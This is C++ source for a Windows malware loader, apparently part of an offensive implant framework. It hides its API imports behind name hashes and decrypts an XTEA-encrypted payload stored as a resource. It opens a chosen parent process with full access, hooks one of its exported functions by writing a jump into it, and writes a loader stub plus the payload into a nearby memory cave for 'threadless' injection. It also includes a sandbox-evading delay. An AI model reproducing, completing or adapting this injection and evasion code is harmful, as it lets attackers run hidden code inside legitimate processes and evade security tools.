#include <loader/loaders.hpp>

namespace Loaders {
    using namespace Loaders::Cipher;
    using namespace Loaders::Memory;

    namespace Utils {

        void x_memcpy(LPVOID Dst, CONST LPVOID Src, SIZE_T n) {

            auto *dst = (char *) Dst;
            auto *src = (const char *) Src;

            for (size_t i = 0; i < n; i++) {
                dst[i] = src[i];
            }
        }

        PVOID x_memset (PVOID dst, INT val, SIZE_T len) {

            uint8_t* ptr = (uint8_t*)dst;
            while (len-- > 0) {
                *ptr++ = val;
            }
            return dst;
        }

        size_t x_strlen(CONST LPSTR s) {

            if (s) {
                const char *end = s;
                for (; *end != NULTERM; ++end);
                return end - s;
            }
            return 0;
        }

        size_t x_wcslen(CONST LPWSTR s) {

            if (s) {
                const wchar_t *end = s;
                for (; *end != WNULTERM; ++end);
                return end - s;
            }
            return 0;
        }

        size_t x_wcstombs(LPSTR str, LPWSTR wcs, SIZE_T size) {

            size_t count = 0;

            while (count < size) {
                if (*wcs > 255) { return (size_t) -1; }

                str[count] = (char) *wcs;
                if (*wcs++ == WNULTERM) {
                    break;
                }
                count++;
            }
            str[count] = 0;
            return count;
        }

        size_t x_mbstowcs(LPWSTR Dst, LPSTR Src, SIZE_T Size) {
            int Count = (int) Size;

            while (--Count >= 0) {
                if (*Dst++ != *Src++) { return Size - Count - 1; }
            }
            return Size - Count;
        }

        size_t x_strcmp(LPSTR Str1, LPSTR Str2) {

            for (; *Str1 == *Str2; Str1++, Str2++) {
                if (*Str1 == NULTERM) {
                    return 0;
                }
            }
            return ((*Str1 < *Str2) ? -1 : +1);
        }

        size_t x_wcscmp(LPWSTR Str1, LPWSTR Str2) {

            for (; *Str1 == *Str2; Str1++, Str2++) {
                if (*Str1 == WNULTERM) {
                    return 0;
                }
            }
            return ((*(wchar_t *) Str1 < *(wchar_t *) Str2) ? -1 : +1);
        }

        int x_memcmp(CONST LPVOID s1, CONST LPVOID s2, SIZE_T n) {

            const auto *c1 = (const uint8_t *) (s1);
            const auto *c2 = (const uint8_t *) (s2);

            for (; n--; c1++, c2++) {
                if (*c1 != *c2)
                    return *c1 < *c2 ? -1 : 1;
            }
            return 0;
        }
    }

    namespace Cipher {
        using namespace Utils;

        template<typename T>
        DWORD GetHashFromString(T Str, SIZE_T Len) {

            if (!Str) {
                return 0;
            }

            auto hash = FNV_OFFSET;

            for (auto i = 0; i < Len; i++) {
                hash ^= Str[i];
                hash *= FNV_PRIME;
            }
            return hash;
        }

        u32Block BlockToUint32 (const byte* src) {

            u32Block block = { };

            block.v0 = (src[0]) << 24 | (src[1]) << 16 | (src[2]) << 8 | src[3];
            block.v1 = (src[4]) << 24 | (src[5]) << 16 | (src[6]) << 8 | src[7];

            return block;
        }

        VOID Uint32ToBlock (uint32_t v0, uint32_t v1, byte* dst)  {

            dst[0] = (v0 >> 24);
            dst[1] = (v0 >> 16);
            dst[2] = (v0 >> 8);
            dst[3] = (v0);
            dst[4] = (v1 >> 24);
            dst[5] = (v1 >> 16);
            dst[6] = (v1 >> 8);
            dst[7] = (v1);
        }

        VOID InitCipher (CipherTxt *c, const byte* m_key) {

            uint32_t key[4] = { };
            uint32_t sum    = { };

            auto delta = XTEA_DELTA;

            for (uint32_t i = 0; i < ARRAY_LEN(key); i++) {
                uint32_t j = i << 2;
                key[i] = U32(m_key[j+0]) << 24 | U32(m_key[j+1]) << 16 | U32(m_key[j+2]) << 8 | U32(m_key[j+3]);
            }

            for (uint32_t i = 0; i < NROUNDS;) {
                c->table[i] = sum + key[sum & 3];
                i++;

                sum += delta;
                c->table[i] = sum + key[(sum >> 11) & 3];
                i++;
            }
        }

        VOID XteaEncrypt(CipherTxt *c, byte *dst, byte *src) {

            u32Block block = BlockToUint32(src);

            for (uint32_t i = 0; i < NROUNDS;) {
                block.v0 += (((block.v1 << 4) ^ (block.v1 >> 5)) + block.v1) ^ (c->table[i]);
                i++;

                block.v1 += (((block.v0 << 4) ^ (block.v0 >> 5)) + block.v0) ^ (c->table[i]);
                i++;
            }

            Uint32ToBlock(block.v0, block.v1, dst);
        }

        VOID XteaDecrypt(CipherTxt *c, byte *dst, byte *src) {

            u32Block block = BlockToUint32(src);

            for (auto i = NROUNDS; i > 0;) {
                i--;
                block.v1 -= (((block.v0 << 4) ^ (block.v0 >> 5)) + block.v0) ^ (c->table[i]);

                i--;
                block.v0 -= (((block.v1 << 4) ^ (block.v1 >> 5)) + block.v1) ^ (c->table[i]);
            }

            Uint32ToBlock(block.v0, block.v1, dst);
        }

        PBYTE *XteaDivide (HEXANE_CTX &Ctx, byte *data, size_t cbData, size_t *cbOut) {

            size_t sectionSize = 8;
            size_t n = (cbData + sectionSize - 1) / sectionSize;
            *cbOut = n;

            PBYTE* sections = { };
            if (!(sections = (PBYTE*) Ctx.Nt.RtlAllocateHeap(LocalHeap, 0, (n * sizeof(PBYTE))))) {
                return nullptr;
            }

            for (size_t i = 0; i < n; i++) {
                if (!(sections[i] = (PBYTE) Ctx.Nt.RtlAllocateHeap(LocalHeap, 0, sectionSize))) {

                    for (size_t j = 0; j < i; j++) {
                        Ctx.Nt.RtlFreeHeap(LocalHeap, 0, sections[j]);
                    }

                    Ctx.Nt.RtlFreeHeap(LocalHeap, 0, sections);
                    goto defer;
                }

                size_t end = (i + 1) * sectionSize;
                size_t copySize = (end > cbData)
                                  ? cbData - i * sectionSize
                                  : sectionSize;

                x_memcpy(sections[i], data + i * sectionSize, copySize);

                if (copySize < sectionSize) {
                    x_memset(sections[i] + copySize, 0, sectionSize - copySize);
                }
            }

            defer:
            return sections;
        }

        VOID XteaCrypt(HEXANE_CTX &Ctx, PBYTE data, SIZE_T cbData, BOOL encrypt, PBYTE m_key) {

            CipherTxt *cx       = { };
            uint64_t ofs        = 0;
            size_t nSections    = { };

            byte *buffer    = { };
            byte** sections = { };

            if (!(cx = (CipherTxt*) Ctx.Nt.RtlAllocateHeap(LocalHeap, 0, sizeof(CipherTxt)))) {
                return;
            }

            InitCipher(cx, m_key);

            if (!(sections = XteaDivide(Ctx, data, cbData, &nSections))) {
                return;
            }

            x_memset(data, 0, cbData);
            for (uint32_t i = 0; i < nSections; i++) {

                buffer = (byte*) Ctx.Nt.RtlAllocateHeap(LocalHeap, 0, 8);

                if (encrypt) {
                    XteaEncrypt(cx, buffer, sections[i]);
                } else {
                    XteaDecrypt(cx, buffer, sections[i]);
                }

                MmPatchData(j, data, (j + ofs), buffer, (j), sizeof(uint64_t));
                Ctx.Nt.RtlFreeHeap(LocalHeap, 0, buffer);

                ofs += sizeof(uint64_t);
            }

            for (uint64_t i = 0; i < nSections; i++) {
                Ctx.Nt.RtlFreeHeap(LocalHeap, 0, sections[i]);
            }

            Ctx.Nt.RtlFreeHeap(LocalHeap, 0, sections);
            Ctx.Nt.RtlFreeHeap(LocalHeap, 0, cx);
        }
    }

    namespace Timer {

        constexpr int RandomSeed() {

            return '32' * -40271 +
                   __TIME__[7] * 1 +
                   __TIME__[6] * 10 +
                   __TIME__[4] * 60 +
                   __TIME__[3] * 600 +
                   __TIME__[1] * 3600 +
                   __TIME__[0] * 36000;
        }

        UINT_PTR Timestamp() {

            LARGE_INTEGER time = { };
            const size_t UNIX_TIME_START = 0x019DB1DED53E8000;
            const size_t TICKS_PER_MILLISECOND = 1000;

            time.u.LowPart = *((DWORD*) (0x7FFE0000 + 0x14));
            time.u.HighPart = *((LONG*) (0x7FFE0000 + 0x1c));

            return (UINT_PTR) ((time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND);
        }

        DWORD RandomNumber32(DWORD seed) {
            auto RtlRandomEx = (RtlRandomEx_t)LdrGetSymbolAddress(LdrGetModuleAddress(NTDLL), RTLRANDOMEX);

            seed = RandomSeed();
            seed = RtlRandomEx(&seed);
            seed = (seed  % (LONG_MAX - 3 + 1)) + 3;

            return seed % 2 == 0
                   ? seed
                   : seed + 1;
        }

        VOID Timeout(size_t ms) {

            constexpr int seed = RandomSeed();

            volatile size_t x = INTERVAL(seed);
            uintptr_t end = Timestamp() + (x * ms);

            while (Timestamp() < end) {
                x += 1;
            }
            if (Timestamp() - end > 2000) {
                return;
            }
        }
    }

    namespace Memory {
        using namespace Loaders::Cipher;
        using namespace Loaders::Utils;

        HANDLE LdrGetParentHandle(HEXANE_CTX &Ctx, PBYTE Parent) {

            HANDLE Proc 			= nullptr;
            HANDLE Snap 			= nullptr;
            CLIENT_ID Cid 			= { };
            PROCESSENTRY32 Entry 	= { };
            OBJECT_ATTRIBUTES Attr 	= { };

            Entry.dwSize = sizeof(PROCESSENTRY32);

            if (!(Snap = Ctx.win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0))) {
                return nullptr;
            }

            if (Ctx.win32.Process32First(Snap, &Entry) == TRUE) {
                while (Ctx.win32.Process32Next(Snap, &Entry) == TRUE) {
                    if (x_strcmp(Entry.szExeFile, (char*)Parent) == 0) {

                        Cid.UniqueThread = nullptr;
                        Cid.UniqueProcess = (HANDLE) Entry.th32ProcessID;

                        InitializeObjectAttributes(&Attr, nullptr, 0, nullptr, nullptr);
                        if (!NT_SUCCESS(Ctx.Nt.NtOpenProcess(&Proc, PROCESS_ALL_ACCESS, &Attr, &Cid))) {
                            return nullptr;
                        }

                        break;
                    }
                }
            }

            if (Snap) {
                Ctx.Nt.NtClose(Snap);
            }

            return Proc;
        }

        HINSTANCE LdrGetModuleAddress(DWORD Hash) {

            HINSTANCE Module = nullptr;

            auto Head = IN_MEMORY_ORDER_MODULE_LIST;
            auto Next = Head->Flink;

            while (Next != Head) {
                auto Mod = MODULE_ENTRY(Next);
                auto Name = MODULE_NAME(Mod);

                if (Name) {
                    if (Hash - GetHashFromString(Name, x_wcslen(Name)) == 0) {
                        Module = (HINSTANCE) Mod->BaseAddress;
                    }
                }
                Next = Next->Flink;
            }
            return Module;
        }

        FARPROC LdrGetSymbolAddress(HMODULE Base, DWORD Hash) {

            FARPROC Symbol = nullptr;

            auto DosHead = IMAGE_DOS_HEADER(Base);
            auto NtHead = IMAGE_NT_HEADERS(Base, DosHead);
            auto Exports = IMAGE_EXPORT_DIRECTORY(DosHead, NtHead);

            if (Exports->AddressOfNames) {

                auto Ordinals = RVA(PWORD, Base, Exports->AddressOfNameOrdinals);
                auto Functions = RVA(PDWORD, Base, Exports->AddressOfFunctions);
                auto Names = RVA(PDWORD, Base, Exports->AddressOfNames);

                for (DWORD i = 0; i < Exports->NumberOfNames; i++) {
                    auto Name = RVA(LPSTR, Base, (long) Names[i]);

                    if (Hash - GetHashFromString(Name, x_strlen(Name)) == 0) {
                        Symbol = (FARPROC) RVA(PULONG, Base, (long) Functions[Ordinals[i]]);
                    }
                }
            }

            defer:
            return Symbol;
        }

        UINT_PTR MmCaveHunter(HEXANE_CTX &Ctx, HANDLE Proc, UINT_PTR Export, SIZE_T Size) {

            UINT_PTR Region = 0;
            for (
                Region = (Export & 0xFFFFFFFFFFF70000) - 0x70000000;
                Region < Export + 0x70000000;
                Region += 0x10000) {

                if ((Ctx.Nt.NtAllocateVirtualMemory(Proc, C_PPTR(&Region), 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ)) >= 0) {
                    return Region;
                }
            }

            return 0;
        }
    }

    namespace Injection {
        using namespace Timer;

        HEXANE_CTX *ResolveApi() {

            HEXANE_CTX *Ctx = { };
            RtlAllocateHeap_t RtlAllocateHeap = { };
            RtlFreeHeap_t RtlFreeHeap = { };

            if (
                !(RtlAllocateHeap   = (RtlAllocateHeap_t)LdrGetSymbolAddress(LdrGetModuleAddress(NTDLL), RTLALLOCATEHEAP)) ||
                !(RtlFreeHeap       = (RtlFreeHeap_t)LdrGetSymbolAddress(LdrGetModuleAddress(NTDLL), RTLFREEHEAP)) ||
                !(Ctx               = (HEXANE_CTX*) RtlAllocateHeap(LocalHeap, 0, sizeof(HEXANE_CTX)))) {
                goto defer;
            }

            if (
                !(FPTR2(Ctx->win32.LoadLibraryA, KERNEL10, LOADLIBRARYA)) ||
                !(FPTR2(Ctx->win32.GetProcAddress, KERNEL10, GETPROCADDRESS)) ||
                !(FPTR2(Ctx->win32.GetModuleHandleA, KERNEL10, GETMODULEHANDLEA)) ||
                !(FPTR2(Ctx->Nt.RtlAllocateHeap, NTDLL, RTLALLOCATEHEAP)) ||
                !(FPTR2(Ctx->Nt.RtlFreeHeap, NTDLL, RTLFREEHEAP)) ||
                !(FPTR2(Ctx->Nt.NtAllocateVirtualMemory, NTDLL, NTALLOCATEVIRTUALMEMORY)) ||
                !(FPTR2(Ctx->Nt.NtProtectVirtualMemory, NTDLL, NTPROTECTVIRTUALMEMORY)) ||
                !(FPTR2(Ctx->Nt.NtWriteVirtualMemory, NTDLL, NTWRITEVIRTUALMEMORY)) ||
                !(FPTR2(Ctx->win32.CreateToolhelp32Snapshot, KERNEL10, CREATETOOLHELP32SNAPSHOT)) ||
                !(FPTR2(Ctx->win32.Process32First, KERNEL10, PROCESS32FIRST)) ||
                !(FPTR2(Ctx->win32.Process32Next, KERNEL10, PROCESS32NEXT)) ||
                !(FPTR2(Ctx->win32.FindResourceA, KERNEL10, FINDRESOURCEA)) ||
                !(FPTR2(Ctx->win32.LockResource, KERNEL10, LOCKRESOURCE)) ||
                !(FPTR2(Ctx->win32.LoadResource, KERNEL10, LOADRESOURCE)) ||
                !(FPTR2(Ctx->win32.SizeofResource, KERNEL10, SIZEOFRESOURCE)) ||
                !(FPTR2(Ctx->win32.FreeResource, KERNEL10, FREERESOURCE)) ||
                !(FPTR2(Ctx->Nt.NtOpenProcess, NTDLL, NTOPENPROCESS)) ||
                !(FPTR2(Ctx->Nt.NtClose, NTDLL, NTCLOSE)) ||
                !(FPTR2(Ctx->win32.GetCurrentProcessId, KERNEL10, GETCURRENTPROCESSID)) ||
                !(FPTR2(Ctx->win32.QueueUserAPC, KERNEL10, QUEUEUSERAPC)) ||
                !(FPTR2(Ctx->Nt.NtTestAlert, NTDLL, NTTESTALERT)) ||
                !(FPTR2(Ctx->win32.SleepEx, KERNEL10, SLEEPEX))) {

                RtlFreeHeap(LocalHeap, 0, Ctx);
                goto defer;
            }

            defer:
            return Ctx;
        }

        UINT_PTR LdrGetExport(HEXANE_CTX &Ctx, PBYTE Module, PBYTE Export) {

            UINT_PTR pExport = 0;

            int reload = 0;
            while (!pExport) {
                if (!(pExport = (UINT_PTR) HASH_FPTR(Module, Export))) {

                    if (reload ||
                        !(Ctx.win32.LoadLibraryA((LPCSTR)Module))) {
                        goto defer;
                    }
                    reload++;
                }
            }

            defer:
            return pExport;
        }

        ORSRC LdrGetIntResource(HEXANE_CTX &Ctx, HMODULE Base, INT RsrcId) {

            HRSRC hResInfo      = nullptr;
            ORSRC Object        = nullptr;

            Object = (ORSRC)Ctx.Nt.RtlAllocateHeap(LocalHeap, 0, sizeof(RSRC));

            if (
                !(hResInfo = Ctx.win32.FindResourceA(Base, MAKEINTRESOURCE(RsrcId), RT_RCDATA)) ||
                !(Object->hGlobal = Ctx.win32.LoadResource(Base, hResInfo)) ||
                !(Object->Size = Ctx.win32.SizeofResource(Base, hResInfo)) ||
                !(Object->ResLock = Ctx.win32.LockResource(Object->hGlobal))) {

                Ctx.Nt.RtlFreeHeap(LocalHeap, 0, Object);
                return nullptr;
            }

            return Object;
        }

        VOID DLL_EXPORT Threadless(HMODULE Base) {

            HEXANE_CTX *Ctx     = nullptr;
            LPVOID Payload		= nullptr;
            HANDLE Proc 		= nullptr;
            ORSRC Rsrc 			= nullptr;

            DWORD Protect 		= 0;
            UINT_PTR pExport 	= 0;
            UINT_PTR xpCopy 	= 0;
            UINT_PTR pHook 		= 0;
            SIZE_T Read, Write 	= 0;
            SIZE_T cbPayload 	= 0;

            BYTE m_key[] = OBF_KEY;

            if (
                !(Ctx       = ResolveApi()) ||
                !(pExport   = LdrGetExport(*Ctx, Module, Export)) ||
                !(Rsrc      = LdrGetIntResource(*Ctx, Base, IDR_RSRC_BIN1))) {
                return;
            }

            Payload = Ctx->Nt.RtlAllocateHeap(LocalHeap, 0, Rsrc->Size);
            MmPatchData(i, B_PTR(Payload), (i), B_PTR(Rsrc->ResLock), (i), Rsrc->Size);

            cbPayload = PAYLOAD_SIZE;
            Ctx->win32.FreeResource(Rsrc->hGlobal);

            if (
                !(Proc  = LdrGetParentHandle(*Ctx, Parent)) ||
                !(pHook = MmCaveHunter(*Ctx, Proc, pExport, cbPayload))) {
                return;
            }

            const auto LdrRva = pHook - (pExport + 5);
            const auto phCopy = pHook;

            MmPatchData(i, B_PTR(&xpCopy), (i), B_PTR(&pExport), (i), sizeof(LPVOID))
            MmPatchData(i, Loader, (0x12 + i), B_PTR(&xpCopy), (i), sizeof(LPVOID))
            MmPatchData(i, Opcode, (0x01 + i), B_PTR(&LdrRva), (i), 4)

            if (
                !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, C_PPTR(&xpCopy), &cbPayload, PAGE_EXECUTE_READWRITE, &Protect)) ||
                !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pExport), C_PTR(Opcode), sizeof(Opcode), &Write)) || Write != sizeof(Opcode)) {
                return;
            }

            cbPayload = PAYLOAD_SIZE;

            if (
                !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, C_PPTR(&phCopy), &cbPayload, PAGE_READWRITE, &Protect)) ||
                !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook), Loader, sizeof(Loader), &Write)) || Write != sizeof(Loader)) {
                return;
            }

            XteaCrypt(*Ctx, B_PTR(Payload), Rsrc->Size, FALSE, m_key);

            if (
                !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook + sizeof(Loader)), Payload, Rsrc->Size, &Write)) || Write != Rsrc->Size ||
                !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, C_PPTR(&pHook), &cbPayload, Protect, &Protect))) {
                return;
            }

            if (Proc) {
                Ctx->Nt.NtClose(Proc);
            }
            if (Payload) {
                x_memset(Payload, 0, Rsrc->Size);
            }

            Execute();
        }

        VOID DLL_EXPORT ThreadPool(HMODULE Base) {

            HEXANE_CTX *Ctx = { };

            if (!(Ctx = ResolveApi())) {
                return;
            }
        }
    }
}
